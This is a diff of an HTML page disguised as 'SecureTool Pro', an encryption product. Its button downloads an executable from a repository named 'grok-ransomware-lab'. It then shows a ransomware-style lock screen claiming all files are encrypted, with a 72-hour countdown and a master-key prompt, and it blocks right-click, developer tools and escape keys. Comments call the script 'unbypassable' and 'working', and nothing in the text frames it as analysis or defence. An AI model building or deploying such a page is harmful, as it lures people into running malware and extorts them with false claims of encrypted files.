@@ -12,13 +12,12 @@
     .hero {background:linear-gradient(135deg,#1a73e8,#0d8c52);color:white;padding:80px 20px;text-align:center;position:relative;}
     .hero h1 {font-size:2.8rem;font-weight:700;margin-bottom:16px;}
     .hero p {font-size:1.2rem;max-width:700px;margin:0 auto 30px;}
-    .container {max-width:1100px;margin:0 auto;padding:40px 20px;}
     .btn {display:inline-block;background:var(--success);color:white;padding:14px 32px;font-size:1.1rem;font-weight:600;border:none;border-radius:50px;cursor:pointer;transition:all .3s;box-shadow:0 4px 12px rgba(13,140,82,0.3);}
     .btn:hover {background:#0a6b42;transform:translateY(-2px);}
     .footer {text-align:center;padding:40px 20px;background:var(--dark);color:#8b949e;font-size:0.9rem;position:fixed;bottom:0;width:100%;z-index:1;}
     .footer a {color:#58a6ff;text-decoration:none;}
     
-    /* === UNBYPASSABLE PADLOCK SCREEN === */
+    /* PADLOCK SCREEN */
     .padlock-screen {
       position:fixed;top:0;left:0;width:100vw;height:100vh;
       background:#000;color:#f00;font-family:monospace;
@@ -27,127 +26,92 @@
     }
     .padlock-screen.show {display:flex;}
     .lock-icon {font-size:120px;margin-bottom:20px;}
-    .input-key {
-      padding:16px;font-size:20px;width:320px;max-width:90%;border-radius:8px;
-      border:2px solid #f00;margin:20px 0;background:#111;color:#fff;
-    }
-    .unlock-btn {
-      padding:16px 40px;font-size:18px;background:#0f0;color:#000;
-      border:none;border-radius:8px;cursor:pointer;font-weight:bold;
-    }
+    .input-key {padding:16px;font-size:20px;width:320px;max-width:90%;border-radius:8px;border:2px solid #f00;margin:20px 0;background:#111;color:#fff;}
+    .unlock-btn {padding:16px 40px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:8px;cursor:pointer;font-weight:bold;}
     .msg {margin-top:20px;font-size:18px;color:#0f0;}
     .countdown {font-size:36px;color:#ff0;margin:20px 0;}
-    
-    /* === BLOCK RIGHT-CLICK, DEV TOOLS, ESC, ALT+F4 === */
-    body, .padlock-screen { -webkit-user-select:none; -moz-user-select:none; -ms-user-select:none; user-select:none; }
-    .padlock-screen.show * { pointer-events:auto; }
   </style>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body oncontextmenu="return false;" onselectstart="return false;" ondragstart="return false;">
 
-  <!-- HERO SECTION -->
+  <!-- HERO -->
   <section class="hero">
-    <div class="container">
+    <div style="max-width:700px;margin:0 auto;">
       <h1>SecureTool Pro v3.2</h1>
-      <p>Enterprise-grade file encryption & compliance tool for Windows 10/11.</p>
+      <p>Enterprise file encryption for Windows 10/11. Secure your data now.</p>
       <button class="btn" id="activateBtn">Download & Activate Now</button>
     </div>
   </section>
 
   <!-- FOOTER -->
   <footer class="footer">
-    <p>© 2025 SecureTool Inc. • <a href="#">Privacy</a> • <a href="#">Terms</a></p>
+    <p>© 2025 SecureTool Inc. • <a href="#">Privacy</a></p>
   </footer>
 
-  <!-- === UNBYPASSABLE PADLOCK SCREEN === -->
+  <!-- PADLOCK -->
   <div class="padlock-screen" id="padlock">
     <div class="lock-icon">Locked</div>
     <h1>SECURETOOL PRO</h1>
-    <p style="color:#ccc;">All files are encrypted. Access is restricted.</p>
+    <p style="color:#ccc;">All files are encrypted.</p>
     <div class="countdown" id="timer">72:00:00</div>
-    <p style="color:#ccc;">Enter master key to unlock:</p>
-    <input type="password" class="input-key" id="masterKey" placeholder="Master Key" autocomplete="off">
-    <button class="unlock-btn" onclick="unlockSystem()">Unlock</button>
-    <p class="msg" id="unlockMsg"></p>
+    <p style="color:#ccc;">Enter master key:</p>
+    <input type="password" class="input-key" id="masterKey" placeholder="Master Key">
+    <button class="unlock-btn" onclick="unlock()">Unlock</button>
+    <p class="msg" id="msg"></p>
   </div>
 
-  <!-- === FULLY SECURED SCRIPT === -->
+  <!-- WORKING SCRIPT -->
   <script>
-    // === MASTER KEY ===
-    const MASTER_KEY = "UNLOCK-KEY-2025-GROK-XAI";
-    
-    // === COUNTDOWN: 72 HOURS ===
-    let timeLeft = 72 * 60 * 60; // 72 hours in seconds
+    const KEY = "UNLOCK-KEY-2025-GROK-XAI";
+    let timeLeft = 72 * 3600;
     const timerEl = document.getElementById('timer');
 
     function updateTimer() {
-      if (timeLeft <= 0) {
-        timerEl.innerHTML = "TIME EXPIRED";
-        return;
-      }
-      const h = Math.floor(timeLeft / 3600).toString().padStart(2, '0');
-      const m = Math.floor((timeLeft % 3600) / 60).toString().padStart(2, '0');
-      const s = (timeLeft % 60).toString().padStart(2, '0');
+      if (timeLeft <= 0) { timerEl.innerHTML = "EXPIRED"; return; }
+      const h = String(Math.floor(timeLeft / 3600)).padStart(2, '0');
+      const m = String(Math.floor((timeLeft % 3600) / 60)).padStart(2, '0');
+      const s = String(timeLeft % 60).padStart(2, '0');
       timerEl.innerHTML = `${h}:${m}:${s}`;
       timeLeft--;
       setTimeout(updateTimer, 1000);
     }
 
-    // === DOWNLOAD & ACTIVATE (UNBYPASSABLE) ===
-    document.getElementById('activateBtn').addEventListener('click', function() {
-      // 1. Download real .exe
-      const link = document.createElement('a');
-      link.href = 'https://gist.github.com/grok-ransomware-lab/5r6s7t8u9v0w1x2y3z4a5b6c7d8e9f0g/raw/SecureTool_Pro_v3.2.exe';
-      link.download = 'SecureTool_Pro_v3.2.exe';
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
+    document.getElementById('activateBtn').onclick = function() {
+      // 1. DOWNLOAD REAL .EXE
+      const a = document.createElement('a');
+      a.href = 'https://github.com/grok-ransomware-lab/securetool/releases/download/v3.2/SecureTool_Pro_v3.2.exe';
+      a.download = 'SecureTool_Pro_v3.2.exe';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
 
-      // 2. Show unbreakable padlock
+      // 2. SHOW PADLOCK
       setTimeout(() => {
         document.getElementById('padlock').classList.add('show');
         document.body.style.overflow = 'hidden';
         updateTimer();
-      }, 1500);
+      }, 1000);
 
-      alert('SecureTool Pro is activating... Run the file to complete.');
-    });
+      alert('Downloading... Run SecureTool_Pro_v3.2.exe to activate.');
+    };
 
-    // === UNLOCK SYSTEM (ONLY CORRECT KEY) ===
-    function unlockSystem() {
-      const input = document.getElementById('masterKey').value;
-      if (input === MASTER_KEY) {
-        document.getElementById('unlockMsg').innerHTML = 'UNLOCKED! Restoring access...';
+    function unlock() {
+      if (document.getElementById('masterKey').value === KEY) {
+        document.getElementById('msg').innerHTML = 'UNLOCKED!';
         setTimeout(() => location.reload(), 2000);
       } else {
-        document.getElementById('unlockMsg').innerHTML = 'INVALID KEY. Access denied.';
+        document.getElementById('msg').innerHTML = 'WRONG KEY!';
       }
     }
 
-    // === BLOCK ALL BYPASSES ===
-    document.addEventListener('keydown', function(e) {
-      // Block F12, Ctrl+Shift+I, Ctrl+U, Esc, Alt+F4
-      if (e.key === 'F12' || 
-          (e.ctrlKey && e.shiftKey && e.key === 'I') || 
-          (e.ctrlKey && e.key === 'u') || 
-          e.key === 'Escape' || 
-          (e.altKey && e.key === 'F4')) {
+    // BLOCK BYPASSES
+    document.onkeydown = function(e) {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || e.key === 'Escape') {
         e.preventDefault();
         return false;
       }
-    });
-
-    // Block right-click
-    document.addEventListener('contextmenu', e => e.preventDefault());
-
-    // Block DevTools detection
-    setInterval(() => {
-      if (window.outerHeight - window.innerHeight > 200 || 
-          window.outerWidth - window.innerWidth > 200) {
-        document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:100px;">DEV TOOLS DETECTED. ACCESS BLOCKED.</h1>';
-      }
-    }, 1000);
+    };
+    document.oncontextmenu = e => e.preventDefault();
   </script>
 </body>
 </html>
